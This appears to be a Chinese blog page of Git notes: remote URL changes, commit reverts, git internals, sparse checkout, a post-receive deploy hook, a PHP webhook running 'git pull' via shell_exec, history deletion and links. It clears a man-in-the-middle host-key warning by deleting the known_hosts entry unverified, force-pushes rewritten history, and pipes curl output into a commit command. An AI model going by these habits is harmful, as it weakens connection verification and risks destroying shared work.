class="line">remote.github.url=git@sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.git</span><br><span class="line">remote.github.fetch=+refs/heads/backup:refs/remotes/github/backup</span><br><span class="line">branch.master.remote=github</span><br><span class="line">branch.master.merge=refs/heads/backup</span><br><span class="line"></span><br><span class="line">运行git config --local -e打开配置信息。</span><br><span class="line">修改其中的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = git@github.com:username/repo.git</span><br><span class="line">为</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = https:<span class="comment">//username@github.com/username/repo.git</span></span><br><span class="line">这样就改为使用https协议了。提交什么的就OK了。</span><br></pre></td></tr></table></figure>
<h3 id="Could-not-read-from-remote-repository"><a href="#Could-not-read-from-remote-repository" class="headerlink" title="Could not read from remote repository"></a>Could not read from remote repository</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git@xxx.com/app/api.git</span><br><span class="line">Cloning into <span class="string">'api'</span>...</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@       WARNING: POSSIBLE DNS SPOOFING DETECTED!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">The ECDSA host key <span class="keyword">for</span> git.staff.sina.com.cn has changed,</span><br><span class="line">and the key <span class="keyword">for</span> the corresponding IP address  </span><br><span class="line">is unknown. This could either mean that</span><br><span class="line">DNS SPOOFING is happening or the IP address <span class="keyword">for</span> the host</span><br><span class="line">and its host key have changed at the same time.</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="line">Someone could be eavesdropping on you right now (man-<span class="keyword">in</span>-the-middle attack)!</span><br><span class="line">It is also possible that a host key has just been changed.</span><br><span class="line">The fingerprint <span class="keyword">for</span> the ECDSA key sent by the remote host is</span><br><span class="line">SHA256:q5enZT9xuv1ySs09+ .</span><br><span class="line">Please contact your system administrator.</span><br><span class="line">Add correct host key <span class="keyword">in</span> /c/Users/xxx/.ssh/known_hosts to get rid <span class="keyword">of</span> <span class="keyword">this</span> message.</span><br><span class="line">Offending ECDSA key <span class="keyword">in</span> /c/Users/xxx/.ssh/known_hosts:<span class="number">8</span></span><br><span class="line">ECDSA host key <span class="keyword">for</span> git.xxx.com has changed and you have requested strict checking.</span><br><span class="line">Host key verification failed.</span><br><span class="line">fatal: Could not read <span class="keyword">from</span> remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br><span class="line"></span><br><span class="line">删除/c/Users/xxx/.ssh/known_hosts 第<span class="number">8</span>行重新clone </span><br><span class="line">git clone git@xxx.com/app/api.git</span><br><span class="line">Cloning into <span class="string">'api'</span>...</span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="string">'git.xxx.com  '</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:q5enZT9xuv1ySs09+ .</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>git.xxx.com, <span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">remote: Enumerating objects: 63303, done.</span></span><br><span class="line"><span class="string">remote: Counting objects: 100% (63303/63303), done.</span></span><br><span class="line"><span class="string">remote: Compressing objects: 100% (19487/19487), done.</span></span><br><span class="line"><span class="string">remote: Total 63303 (delta 42781), reused 62710 (delta 42523)</span></span><br><span class="line"><span class="string">Receiving objects: 100% (63303/63303), 23.86 MiB | 14.71 MiB/s, done.</span></span><br><span class="line"><span class="string">Resolving deltas: 100% (42781/42781), done.</span></span><br><span class="line"><span class="string">Checking out files: 100% (9761/9761), done.</span></span><br></pre></td></tr></table></figure>
<h3 id="Git-优雅的撤销中间某次提交"><a href="#Git-优雅的撤销中间某次提交" class="headerlink" title="Git 优雅的撤销中间某次提交"></a>Git 优雅的撤销中间某次提交</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">git revert <span class="number">100047</span>dcc -m <span class="number">1</span></span><br><span class="line">参数 -m 就是指定要撤销的那个提价，从左往右，从 <span class="number">1</span> 开始数；也就是我撤销的是 <span class="number">0099</span>aca7。</span><br><span class="line">接着其把代码冲突，然后我就解决冲突，保留主分支的代码，去掉那个人的代码。</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>，首先git log查看提交记录，找到出错的前一笔提交的commit_id</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>，用命令git rebase -i commit_id ,查找提交记录</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>，将出错那笔提交的pick改为drop</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>，Esc，:wq</span><br><span class="line"></span><br><span class="line">1、git reset --hard 1d7444 #回退到出错版本前一个commit</span><br><span class="line"></span><br><span class="line">2、git cherry-pick 626335 #将某次commit的更改应用到当前版本(将出错 cmmit 之后别人提交的代码合并到当前正常代码分支上)</span><br><span class="line"></span><br><span class="line">3、git push origin HEAD --force  #强制提交</span><br><span class="line">https:<span class="comment">//learnku.com/articles/31705</span></span><br></pre></td></tr></table></figure>
<h3 id="git原理"><a href="#git原理" class="headerlink" title="git原理"></a>git原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">创建 blob 对象：</span><br><span class="line"></span><br><span class="line">$ echo <span class="string">'test content'</span> | git hash-object -w --stdin</span><br><span class="line"></span><br><span class="line">-w 表示存储对象。</span><br><span class="line"></span><br><span class="line">d670460b4b4aece5915caf5c68d12f560a9fe3e</span><br><span class="line"></span><br><span class="line">返回一个长度为 <span class="number">40</span> 字符的校验和，为对象名。校验和是一个 SHA<span class="number">-1</span> 哈希值，由对象数据和一个 header 一起做 SHA<span class="number">-1</span> 校验运算而成。</span><br><span class="line"></span><br><span class="line">读取 blod 对象</span><br><span class="line"></span><br><span class="line">$ git cat-file -p d670460b4b4aece5915caf5c68d12f560a9fe3e</span><br><span class="line"></span><br><span class="line">test content</span><br><span class="line"></span><br><span class="line">-p Pretty-print the contents <span class="keyword">of</span> object based on its type.</span><br><span class="line"></span><br><span class="line">-t 输出对象类型</span><br><span class="line"></span><br><span class="line">blob</span><br><span class="line">HEAD 引用</span><br><span class="line"></span><br><span class="line">用途：记录当前分支所在的分支引用</span><br><span class="line"></span><br><span class="line">存储当前分支的引用的引用，是一个符号引用，不像普通引用包含一个 SHA<span class="number">-1</span> 值。</span><br><span class="line"></span><br><span class="line">$ cat .git/HEAD</span><br><span class="line"></span><br><span class="line">ref: refs/heads/test</span><br><span class="line"> cat .git/refs/heads/master</span><br><span class="line"><span class="number">4</span>b8c160d38e4befa3bc515f12208583dd4e8814f</span><br><span class="line"></span><br><span class="line">$ cat .git/refs/remotes/origin/master</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>b8c160d38e4befa3bc515f12208583dd4e8814f</span><br><span class="line"></span><br><span class="line">git cat-file -p <span class="number">4</span>b8c160d38e4befa3bc515f12208583dd4e8814f</span><br><span class="line"></span><br><span class="line">tree <span class="number">40</span>db0fc4e10857c0a774365c799ffd7e2fe4c052</span><br><span class="line">parent cb65f329f7928a39e801af5151539246a70dfea6</span><br><span class="line">parent ae4107d8e7eb6dec926f2488c70dab23a06bc9d8</span><br><span class="line">author <span class="number">666</span> <span class="number">1565317494</span> +<span class="number">0800</span></span><br><span class="line">committer <span class="number">66</span> <span class="number">1565317494</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">Merge branch <span class="string">'feature/test'</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/32272</span></span><br></pre></td></tr></table></figure>
<h3 id="Git-获取指定文件"><a href="#Git-获取指定文件" class="headerlink" title="Git 获取指定文件"></a>Git 获取指定文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//me.jinchuang.org/archives/145.html</span></span><br><span class="line">具体实现如下：</span><br><span class="line">$mkdir project_folder</span><br><span class="line">$cd project_folder</span><br><span class="line">$git init</span><br><span class="line">$git remote add -f origin &lt;url&gt;</span><br><span class="line">上面的代码会帮助你创建一个空的本地仓库，同时将远程Git Server URL加入到Git Config文件中。</span><br><span class="line">接下来，我们在Config中允许使用Sparse Checkout模式：</span><br><span class="line">$git config core.sparsecheckout <span class="literal">true</span> </span><br><span class="line">接下来你需要告诉Git哪些文件或者文件夹是你真正想Check Out的，你可以将它们作为一个列表保存在.git/info/sparse-checkout文件中。</span><br><span class="line">例如：</span><br><span class="line">$echo “libs” &gt;&gt; .git/info/sparse-checkout </span><br><span class="line">$echo “apps/register.go” &gt;&gt; .git/info/sparse-checkout </span><br><span class="line">$echo “resource/css” &gt;&gt; .git/info/sparse-checkout </span><br><span class="line">最后，你只要以正常方式从你想要的分支中将你的项目拉下来就可以了：</span><br><span class="line">$git pull origin master</span><br></pre></td></tr></table></figure>
<h3 id="Git-实现-Laravel-项目的自动化部署"><a href="#Git-实现-Laravel-项目的自动化部署" class="headerlink" title="Git 实现 Laravel 项目的自动化部署"></a>Git 实现 Laravel 项目的自动化部署</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个名叫jouzeyu的用户</span><br><span class="line">adduser jouzeyu</span><br><span class="line">#在根目录下的 home 文件夹下创建一个git文件夹</span><br><span class="line">mkdir /home/git </span><br><span class="line">#切换到创建好的git文件夹</span><br><span class="line">cd /home/git</span><br><span class="line">#创建 .ssh文件夹，里面主要用来放公钥</span><br><span class="line">mkdir .ssh</span><br><span class="line">#切换到.ssh文件夹并创建authorized_keys文件</span><br><span class="line">cd .ssh</span><br><span class="line">touch authorized_keys</span><br><span class="line"></span><br><span class="line">使用 cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub 命令可以获取公钥，复制它，使用 vi 或者 vim 命令把它粘贴到我们之前创建的 authorized_keys 文件中，使用:wq 保存</span><br><span class="line"></span><br><span class="line">mkdir /www/wwwroot/git</span><br><span class="line">cd /www/wwwroot/git</span><br><span class="line">初始化仓库：</span><br><span class="line"></span><br><span class="line">#初始化一个裸仓库（强烈建议）</span><br><span class="line">git init --bare website.git</span><br><span class="line">#配置仓库的权限，让我们之前创建好的git用户jouzeyu能读写</span><br><span class="line">chown -R git:git website.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#创建我服务器上的项目目录test</span><br><span class="line">mkdir /www/wwwroot/test</span><br><span class="line">#克隆仓库</span><br><span class="line">git clone /www/wwwroot/git/website.git</span><br><span class="line">#设置权限</span><br><span class="line">chown -R git website</span><br><span class="line"></span><br><span class="line"># 通过ip地址从配置好的线上仓库拉取下来</span><br><span class="line">git clone git@<span class="number">47.97</span><span class="number">.121</span>.XXX:<span class="regexp">/www/</span>wwwroot/git/website.git</span><br><span class="line"># 如果有配置域名的话也可以通过域名拉取</span><br><span class="line">git clone git@www.XXX.XXX:<span class="regexp">/www/</span>wwwroot/git/website.git</span><br><span class="line"></span><br><span class="line"># 打开刚才克隆下来的本地仓库</span><br><span class="line">cd website</span><br><span class="line"># 创建README.md文件</span><br><span class="line">touch README.md</span><br><span class="line">git add .</span><br><span class="line">git commit -m<span class="string">"创建README.md文件"</span></span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">#切换到这个目录</span><br><span class="line">cd /www/wwwroot/git/website.git/hooks</span><br><span class="line"># 生成post-receive文件</span><br><span class="line">touch post-receive</span><br><span class="line"># 使用vim编辑</span><br><span class="line">vim post-receive</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"># 打印输出</span><br><span class="line">echo <span class="string">'======上传代码到服务器======'</span></span><br><span class="line"># 打开线上项目文件夹</span><br><span class="line">cd /www/wwwroot/test/website</span><br><span class="line"># 这个很重要，如果不取消的话将不能在cd的路径上进行git操作</span><br><span class="line">unset GIT_DIR</span><br><span class="line">git pull origin master</span><br><span class="line"># 自动编译vue项目,如有需要请去掉前面的#号</span><br><span class="line"># npm run build</span><br><span class="line"># 自动更新composer（我暂时没试过）</span><br><span class="line"># composer update</span><br><span class="line">echo $(date) &gt;&gt; hook.log</span><br><span class="line">echo <span class="string">'======代码更新完成======'</span></span><br><span class="line"></span><br><span class="line">chmod +x post-receive</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33689</span></span><br></pre></td></tr></table></figure>
<h3 id="gitee-和-GitHub-的-webhook-的使用"><a href="#gitee-和-GitHub-的-webhook-的使用" class="headerlink" title="gitee 和 GitHub 的 webhook 的使用"></a>gitee 和 GitHub 的 webhook 的使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//访问秘钥</span></span><br><span class="line">$keySecret = <span class="string">'^!@KVzPZ^DaRNA7R53353%7aEAfsfdOptH7b%0i5'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要更新的项目目录</span></span><br><span class="line">$wwwRoot = [</span><br><span class="line">    <span class="string">'/www/wwwroot/test1'</span>,</span><br><span class="line">    <span class="string">'/www/wwwroot/test2'</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存运行脚本的日志</span></span><br><span class="line">$logFile = <span class="string">'log/layuimini-githook.log'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//git执行命令</span></span><br><span class="line">$gitCommand = <span class="string">'git pull'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否开启秘钥认证(已实现gitee和github)</span></span><br><span class="line"><span class="keyword">if</span> (isset($keySecret) &amp;&amp; !empty($keySecret)) &#123;</span><br><span class="line">    list($headers, $gitType) = [[], <span class="literal">null</span>];</span><br><span class="line">    foreach ($_SERVER <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="string">'HTTP_'</span> == substr($key, <span class="number">0</span>, <span class="number">5</span>) &amp;&amp; $headers[str_replace(<span class="string">'_'</span>, <span class="string">'-'</span>, substr($key, <span class="number">5</span>))] = $value;</span><br><span class="line">        <span class="keyword">if</span> (empty($gitType) &amp;&amp; strpos($key, <span class="string">'GITEE'</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            $gitType = <span class="string">'GITEE'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (empty($gitType) &amp;&amp; strpos($key, <span class="string">'GITHUB'</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            $gitType = <span class="string">'GITHUB'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($gitType == <span class="string">'GITEE'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isset($headers[<span class="string">'X-GITEE-TOKEN'</span>]) || $headers[<span class="string">'X-GITEE-TOKEN'</span>] != $keySecret) &#123;</span><br><span class="line">            die(<span class="string">'GITEE - 请求失败，秘钥有误'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; elseif ($gitType == <span class="string">'GITHUB'</span>) &#123;</span><br><span class="line">        $json_content = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">        $signature = <span class="string">"sha1="</span> . hash_hmac(<span class="string">'sha1'</span>, $json_content, $keySecret);</span><br><span class="line">        <span class="keyword">if</span> ($signature != $headers[<span class="string">'X-HUB-SIGNATURE'</span>]) &#123;</span><br><span class="line">            die(<span class="string">'GITHUB - 请求失败，秘钥有误'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        die(<span class="string">'请求错误，未知git类型'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">!is_array($wwwRoot) &amp;&amp; $wwwRoot = [$wwwRoot];</span><br><span class="line">foreach ($wwwRoot <span class="keyword">as</span> $vo) &#123;</span><br><span class="line">    $shell = sprintf(<span class="string">"cd %s &amp;&amp; git pull 2&gt;&amp;1"</span>, $vo);</span><br><span class="line">    $output = shell_exec($shell);</span><br><span class="line">    $log = sprintf(<span class="string">"[%s] %s \n"</span>, date(<span class="string">'Y-m-d H:i:s'</span>, time()) . <span class="string">' - '</span> . $vo, $output);</span><br><span class="line">    echo $log;</span><br><span class="line">    file_put_contents($logFile, $log, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">修改项目目录权限 chown -R www:www 项目路径</span><br></pre></td></tr></table></figure>
<h3 id="Forestry-管理基于-GitHub-的图床"><a href="#Forestry-管理基于-GitHub-的图床" class="headerlink" title="Forestry 管理基于 GitHub 的图床"></a>Forestry 管理基于 GitHub 的图床</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">免费提供静态博客管理功能，使你的博客拥有 CMS 般的体验。</span><br><span class="line">你可以很轻松地编写、修改和发布博客，包括图片与文件，而不需要手动去编译上传，Forestry 已经为你自动处理了</span><br><span class="line">github登录https:<span class="comment">//forestry.io/</span></span><br><span class="line"></span><br><span class="line">授权对应的GitHub库</span><br><span class="line"></span><br><span class="line">修改时区</span><br><span class="line"></span><br><span class="line">Settings &gt;&gt; General &gt;&gt; TIMEZONE，选择 (GMT+<span class="number">08</span>:<span class="number">00</span>) Beijing，保存 Save settings</span><br><span class="line"></span><br><span class="line">修改上传规则</span><br><span class="line"></span><br><span class="line">Settings &gt;&gt; Media &gt;&gt; UPLOAD DIRECTORY 改为空</span><br><span class="line">Settings &gt;&gt; Media &gt;&gt; PUBLIC PATH 改为空</span><br><span class="line">Settings &gt;&gt; Media &gt;&gt; FILE PATH 改为 :year::month::day:<span class="regexp">/:filename:</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">本地上传文件 在GitHub可以看到 </span></span><br><span class="line"><span class="regexp"> 图片地址 https:/</span><span class="regexp">/cdn.jsdelivr.net/g</span>h/sushengbuhuo/pics@master/<span class="number">20191022</span>/钟楚红.jpg</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//gleehub.com/other/shi-yong-forestry-guan-li-ji-yu-github-de-tu-chuang.html</span></span><br><span class="line">使用jsDelivr加速Github仓库的图片作为博客的图床 https:<span class="comment">//tingtas.com/posts/4341d485/#前言</span></span><br></pre></td></tr></table></figure>
<h3 id="删除git历史"><a href="#删除git历史" class="headerlink" title="删除git历史"></a>删除git历史</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git checkout --orphan <span class="keyword">new</span></span><br><span class="line">git add -A</span><br><span class="line">git commit -m <span class="string">"init"</span></span><br><span class="line">    git branch -D master</span><br><span class="line"></span><br><span class="line">git branch -m <span class="keyword">new</span> master</span><br><span class="line">git push --set-upstream origin master -f</span><br><span class="line">https:<span class="comment">//juejin.im/post/5be995c25188250fa8358f9d</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/30215" target="_blank" rel="noopener">Linux 环境下 Git 服务器的搭建</a></p>
<p><a href="https://github.com/letseeqiji/git-helper/blob/master/README.md" target="_blank" rel="noopener">Git 命令行辅助脚本工具</a></p>
<p><a href="http://wiki.jikexueyuan.com/project/github-pages-basics/" target="_blank" rel="noopener">GitHub Pages 指南极客学院</a></p>
<p><a href="https://www.boatsky.com/blog/12" target="_blank" rel="noopener">git简化笔记</a></p>
<p><a href="http://pinkyjie.com/2014/08/10/git-notes-part-3/" target="_blank" rel="noopener">Git笔记(三)——[cherry-pick, merge, rebase]</a></p>
<p><a href="http://cs-cjl.com/2014/05/06/learn_git_with_me_12" target="_blank" rel="noopener">跟我一起学Git(十二) 合并项目 </a></p>
<p><a href="https://zhuanlan.zhihu.com/p/34197548" target="_blank" rel="noopener">GIT使用rebase和merge的正确姿势</a></p>
<p><a href="https://www.playpi.org/2019030601.html" target="_blank" rel="noopener">Github 的 WebHooks 实现代码自动更新</a></p>
<p><a href="https://sourcegraph.com/welcome" target="_blank" rel="noopener">GitHub搜索</a></p>
<p><a href="https://github.com/hotvulcan/Thanos.sh" target="_blank" rel="noopener">随机删文件</a></p>
<p><a href="https://github.com/LCTT/Grank" target="_blank" rel="noopener">Github 项目活跃度分析工具</a></p>
<p><a href="https://git-issues.now.sh/" target="_blank" rel="noopener">浏览 GitHub 问题和提取请求的方法</a></p>
<p><a href="https://github.com/happypeter/gitbeijing" target="_blank" rel="noopener">github 图解教程</a></p>
<p><a href="https://zmcdbp.com/install-gogs-in-windows/" target="_blank" rel="noopener">在Windows安装Gogs</a></p>
<p><a href="https://blog.yiranzai.cn/posts/48628/" target="_blank" rel="noopener">svn安装和使用总结</a></p>
<p><a href="http://whatthecommit.com/" target="_blank" rel="noopener">随机生成 Git commit git commit -m $(curl -s http://whatthecommit.com/index.txt)
</a></p>
<p><a href="https://blog.yiranzai.cn/posts/48629/" target="_blank" rel="noopener">CentOS 7 | Firewall防火墙使用总结</a></p>
<p><a href="https://blog.yiranzai.cn/posts/26850/" target="_blank" rel="noopener">基于Gitea打造一个属于你自己的代码托管平台</a></p>
<p><a href="https://blog.yiranzai.cn/posts/26847/" target="_blank" rel="noopener">基于 Gitea+Drone CI+Vault 打造属于自己的CI/CD工作流</a></p>
<p><a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">Git 练习场–直观形象又好玩</a></p>
<p><a href="http://fanqieto.top/2018/02/27/linux%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/" target="_blank" rel="noopener">linux从入门到实践</a></p>
<p><a href="http://fanqieto.top/2017/11/29/nginx%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/" target="_blank" rel="noopener">nginx从入门到实践</a></p>
<p><a href="https://www.cnblogs.com/dee0912/p/5815267.html" target="_blank" rel="noopener">在 Linux 下搭建 Git 服务器</a></p>
<p><a href="https://mp.weixin.qq.com/s/sXQ3L-CWvcEW-l14JYW8uA" target="_blank" rel="noopener">学习git</a></p>
<p><a href="https://www.kancloud.cn/yangweijie/yang_book/30713" target="_blank" rel="noopener">学好英语，走向国际</a></p>
<p><a href="https://learnku.com/articles/24382" target="_blank" rel="noopener">Mac/Linux 安装中文版 man 帮助命令</a></p>
<p><a href="https://github.com/guanguans/notes" target="_blank" rel="noopener">PHP、Git、Shell等笔记</a></p>
<p><a href="https://learnku.com/articles/24360" target="_blank" rel="noopener">netstat 命令查看连接数判断攻击</a></p>
<p><a href="http://coderlt.coding.me/2016/05/01/build-github-wiki/" target="_blank" rel="noopener">在Github上建立自己的Wiki</a></p>
<p><a href="https://tonydeng.github.io/2015/07/08/how-to-undo-almost-anything-with-git/" target="_blank" rel="noopener">Git的各种Undo技巧</a></p>
<p><a href="http://www.syyong.com/linux/PHPer-need-to-master-the-common-linux-commands.html" target="_blank" rel="noopener">PHPer 要掌握的常用 linux 命令</a></p>
<p><a href="https://learnku.com/articles/33729" target="_blank" rel="noopener">GitLab 安装、管理、运维</a></p>
<p><a href="https://github.dev/" target="_blank" rel="noopener">个人网站生成器工具</a></p>
<p><a href="https://github.com/royeo/git-checkout-branch" target="_blank" rel="noopener">切换git分支</a></p>
